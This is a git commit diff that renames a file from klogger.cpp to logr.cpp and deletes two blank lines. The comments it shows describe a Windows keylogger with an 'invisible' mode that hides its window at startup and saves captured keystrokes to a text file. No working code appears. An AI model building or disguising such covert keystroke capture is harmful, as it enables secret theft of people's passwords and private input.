9932e3662ad20d4f69d8faa6a1a5f6f121cd7a53
steve727 <44914462+steve727@users.noreply.github.com>
2021-10-07 16:16:21 -0400

    Update and rename klogger.cpp to logr.cpp

--- logr.cpp
+++ logr.cpp
@@ -1,7 +1,5 @@
 // To change visibility of the window set the #define in line 9 to visible or invisible.
-
 // Compile into an .exe, and then run. Visual Studio is good for this.
-
 // invisible makes the window of the logger disappear, and it also starts up hidden from view. Note that it is still visible in the task manager.
 // visible is visible, and the window does not close when typing. Great for testing it out.
 // Both of these save the keystrokes to a .txt file when closed.
